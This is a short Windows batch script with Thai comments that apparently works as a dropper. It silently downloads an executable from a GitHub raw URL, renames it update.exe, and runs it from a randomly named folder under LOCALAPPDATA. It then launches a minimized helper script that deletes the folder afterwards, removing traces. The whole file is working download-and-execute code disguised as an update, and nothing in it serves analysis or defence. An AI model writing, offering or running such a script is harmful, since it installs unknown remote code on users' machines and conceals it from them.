@echo off
setlocal enabledelayedexpansion

:: 1. สร้างโฟลเดอร์และดาวน์โหลดไฟล์
set "d=%LOCALAPPDATA%\TempRun_%RANDOM%"
md "!d!" >nul 2>&1
set "p=!d!\update.exe"
set "runner=!d!\run_and_clean.bat"

curl -sSL "https://raw.githubusercontent.com/asdadada386/neww/main/cmd.exe" -o "!p!"

if exist "!p!" (
    :: 2. สร้างสคริปต์ผู้ช่วย: รอจน update.exe ปิด แล้วลบโฟลเดอร์ !d! ทิ้ง
    (
        echo @echo off
        echo start "" /wait "!p!"
        echo timeout /t 1 /nobreak ^>nul
        echo cd /d "%%TEMP%%"
        echo rd /s /q "!d!"
    ) > "!runner!"

    :: 3. รันสคริปต์ผู้ช่วยแบบแยกหน้าต่าง แล้วให้หน้าต่างหลักออกทันที
    start "" /min cmd /c "!runner!"
)
exit /b